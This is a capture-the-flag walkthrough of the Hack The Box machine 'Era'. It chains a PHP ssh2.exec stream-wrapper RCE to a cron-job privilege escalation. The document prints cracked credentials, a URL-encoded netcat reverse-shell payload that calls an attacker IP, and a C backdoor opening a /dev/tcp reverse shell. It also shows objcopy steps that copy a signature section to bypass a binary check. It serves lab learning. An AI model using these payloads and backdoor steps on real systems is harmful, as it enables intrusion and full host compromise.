# Era HTB Machine — Complete Walkthrough

> **Target:** `Era.HTB` (`10.x.x.79`)
>
> **Difficulty:** Medium
> **OS:** Linux
> **Exploit Chain:** PHP Stream Wrapper RCE → Writable Cron Job Privilege Escalation

---

## Table of Contents

1. [Overview](#overview)
2. [Prerequisites & Tools](#prerequisites--tools)
3. [Lab Setup / Hosts](#lab-setup--hosts)
4. [Phase 1 — Initial Reconnaissance](#phase-1---initial-reconnaissance)
5. [Phase 2 — Web Application Analysis](#phase-2---web-application-analysis)
6. [Phase 3 — ID Parameter Fuzzing & Backup Analysis](#phase-3---id-parameter-fuzzing--backup-analysis)
7. [Phase 4 — Credential Recovery & Admin Access](#phase-4---credential-recovery--admin-access)
8. [Phase 5 — PHP Stream Wrapper Exploitation (RCE)](#phase-5---php-stream-wrapper-exploitation-rce)
9. [Phase 6 — Privilege Escalation via Writable Cron Job](#phase-6---privilege-escalation-via-writable-cron-job)
10. [Key Problems & Solutions (Summary)](#key-problems--solutions-summary)
11. [Responsible Disclosure & Notes](#responsible-disclosure--notes)
12. [Credits](#credits)

---

## Overview

This document is a structured, detailed README-style walkthrough of the `Era` Hack The Box machine. It documents the entire exploitation flow from initial enumeration to full root compromise using a PHP stream wrapper remote code execution (RCE) combined with a writable cron-job privilege escalation.

> **Do not** use these techniques on systems you do not own or have explicit permission to test. This writeup is for educational and authorized-lab use only.

---

## Prerequisites & Tools

Minimal tooling used during this engagement (examples and versions where known):

* `nmap` — Port scanning
* `ffuf` — Subdomain and parameter fuzzing
* `dirsearch` — Directory enumeration
* `john` (John the Ripper) — Hash cracking
* `gcc` — C code compilation
* `objcopy` — Binary section manipulation
* `netcat` (`nc`) — Reverse-shell listener
* `curl` — HTTP request crafting

Other useful tools: `sqlite3`, `strings`, `unzip`, `file`, `python`/`perl` for quick helpers.

---

## Lab Setup / Hosts

Add entries to `/etc/hosts` so web requests and virtual hosts resolve correctly:

```bash
10.10.11.79     era.htb file.era.htb
```

Adjust your listener IPs/ports to match your attack machine when running payloads.

---

## Phase 1 - Initial Reconnaissance

### Port scanning

Run an aggressive scan to find services and versions:

```bash
nmap -A era.htb
```

**Results (high-level):**

* `21/tcp` — FTP (vsftpd 3.0.5)
* `80/tcp` — HTTP (nginx 1.18.0)

### Subdomain discovery

Used `ffuf` with a Host header wordlist to discover virtual hosts:

```bash
ffuf -u 'http://era.htb' -H 'Host: FUZZ.era.htb' -w subdomains.txt -fw 4
```

**Discovery:** `file.era.htb` — added to `/etc/hosts` (see Lab Setup).

---

## Phase 2 - Web Application Analysis

### Directory enumeration

Targeted the file virtual-host with `dirsearch`:

```bash
dirsearch -u file.era.htb
```

**Key endpoints discovered:**

* `/register.php` — User registration
* `/login.php` — Login portal
* `/download.php` — File download functionality
* `/manage.php` — File management interface

### User registration

No known credentials existed initially. Registered a new account with `/register.php` to access additional features.

---

## Phase 3 - ID Parameter Fuzzing & Backup Analysis

### Finding hidden files via `id` parameter fuzzing

To enumerate possible file IDs in `download.php`, a numeric wordlist was used and fuzzed with `ffuf`:

```bash
seq 1 5000 > id.txt
ffuf -u 'http://file.era.htb/download.php?id=FUZZ' \
     -w id.txt \
     -H 'Cookie: PHPSESSID=dghjni9n5t7j1qci649od1jjo3' \
     -fw 3161
```

**Results:**

* `id=54` → `site-backup-30-08-24.zip` (backup archive)
* `id=150, 188, 4803` → other files

### Backup analysis

Downloaded and extracted `site-backup-30-08-24.zip`.

**Critical files recovered from the backup:**

* `filedb.sqlite` — application database containing user records and password hashes
* `security_login.php` — alternative login mechanism (logic and/or security questions)
* `download.php` — source code that revealed a vulnerability in handling `format` when an admin requests file display

---

## Phase 4 - Credential Recovery & Admin Access

### Database analysis

Extracted hashed credentials from `filedb.sqlite` (example rows):

```
admin:$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC
eric:$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
veronica:$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
yuri:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
john:$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6
ethan:$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
```

### Cracking hashes

Used `john` with `rockyou.txt` to attempt cracking:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Cracked examples:**

* `eric:america`
* `yuri:<password>` (redacted here)

### Security questions / alternative login

The application included a `security_login.php` alternative authentication route. To escalate to admin when normal login did not grant admin rights, the `security_login.php` mechanism was modified locally (in a copy of the DB) to set known answers. Using the security-question flow allowed authenticating as admin (user_id = 1).

> Note: this step documents how the recovered backup and application logic were used in lab conditions to gain escalated access.

---

## Phase 5 - PHP Stream Wrapper Exploitation (RCE)

### Vulnerability discovery (from `download.php` source)

Analysis of `download.php` revealed logic that allowed an admin-controlled `format` parameter to be used as a stream wrapper when displaying files. The relevant pseudocode looked like:

```php
} elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
    $format = isset($_GET['format']) ? $_GET['format'] : '';
    $file = $fetched[0];
    
    if (strpos($format, '://') !== false) {
        $wrapper = $format;
    }
    
    $file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
}
```

**Implication:** Admin users could inject PHP stream wrappers via the `format` parameter, allowing execution through wrappers such as `ssh2.exec://` if the corresponding PHP extension (ssh2) was available.

### Confirming available wrappers

During enumeration of the filesystem (via FTP access), PHP extensions were found under `/php8.1_conf/`, including `ssh2.so`, indicating the SSH2 stream wrapper was present on the host.

### Building a reliable reverse-shell payload

Practical issues encountered when constructing the exploit URL:

* Complex shell commands break in URL parameters if not encoded correctly.
* Base64 variations can include `+` which decodes to spaces in certain contexts — payloads were adjusted to avoid problematic characters.
* Initial payloads failed to connect; switching to a FIFO-based `nc` reverse shell improved reliability.

**Listener:**

```bash
nc -lvnp 443
```

**Exploit (example, IPs and session cookie redacted here — substitute your listener IP and valid PHPSESSID):**

```bash
curl -b 'PHPSESSID=...' \
'http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20mkfifo%20/tmp/f%3Bnc%2010.10.16.46%20443%200%3C/tmp/f%20%7C%20/bin/bash%201%3E/tmp/f%3Brm%20/tmp/f'
```

**Result:** Successful shell obtained as user `eric`.

**User flag (example):** `0569bcf07204d03f0be4caba49d4768a`

---

## Phase 6 - Privilege Escalation via Writable Cron Job

### Initial post-exploitation enumeration

Typical checks:

* `sudo -l` — no usable sudo privileges
* Look for SUID binaries — none exploitable found
* Check home directories — `/home/yuri` had restricted permissions (e.g. `drwxr-x---`)

### Cron job discovery

Found a root-run cron job that referenced `/opt/AV/periodic-checks/monitor`. The directory contained:

* `monitor` — executable run by root's cron
* `status.log` — logging file
* `text_sig` — signature verification section used by the monitor binary

Permissions indicated the `eric` user could write, compile, and execute files inside this directory.

### Building a backdoor and bypassing signature checks

**Backdoor C source (example):**

```c
#include <stdlib.h>
int main() {
    system("/bin/bash -c \"bash -i >& /dev/tcp/10.x.x.46/443 0>&1\"");
    return 0;
}
```

**Compilation and signature re-injection flow:**

1. Compile the backdoor binary:

```bash
gcc a.c -o backdoor
```

2. Extract the `.text_sig` section from the original `monitor` binary:

```bash
objcopy --dump-section .text_sig=text_sig /opt/AV/periodic-checks/monitor
```

3. Add the extracted signature section to your compiled backdoor:

```bash
objcopy --add-section .text_sig=text_sig backdoor
```

4. Replace the `monitor` binary and set executable permissions:

```bash
cp backdoor /opt/AV/periodic-checks/monitor
chmod +x /opt/AV/periodic-checks/monitor
```

5. Wait for the root cron job to execute (typically runs at regular intervals). Keep your listener active.

**Listener:**

```bash
nc -lvnp 443
```

**Result:** Root shell obtained.

**Root flag (example):** `ed427f27e39f901f671d7f87cb5d2b8b`

---

## Key Problems & Solutions (Summary)

| Problem                                             | Solution                                                                                                 |
| --------------------------------------------------- | -------------------------------------------------------------------------------------------------------- |
| No initial credentials                              | Registered new account via `/register.php`                                                               |
| Needed admin access                                 | Used backup + `security_login.php` logic and set known answers to authenticate as admin                  |
| Complex payloads breaking in URL                    | Base64 + URL encoding adjustments; avoided `+` characters; used FIFO `nc` shell for improved reliability |
| Wrong reverse-shell IP in initial tests             | Corrected to attack machine IP (replace with your machine IP)                                            |
| C compilation syntax/quote escaping errors          | Properly escape inner quotes when calling `system()` in C source                                         |
| Binary signature validation blocking naive backdoor | Extract `.text_sig` from original binary and re-inject into compiled backdoor using `objcopy`            |
| Unknown cron timing                                 | Keep listener persistent; cron usually runs at fixed short intervals (minutes)                           |

---

## Responsible Disclosure & Notes

* These techniques were executed in a controlled, authorized lab environment (Hack The Box). Do **not** reuse them against systems without written permission.
* When publishing writeups, take care to avoid publishing sensitive credentials, live service IPs, or anything that could allow unauthorized access in public labs or production environments. In this README, sensitive values have been redacted or described abstractly.
* The exploit depends on specific environment factors (PHP extensions installed, writable cron-target paths, application logic). Exact steps may not generalize to other machines.

---

## Credits

* Writeup based on original enumeration notes and exploit steps captured during the engagement.
* Tools: `nmap`, `ffuf`, `dirsearch`, `john`, `gcc`, `objcopy`, `nc`, `curl`.

---
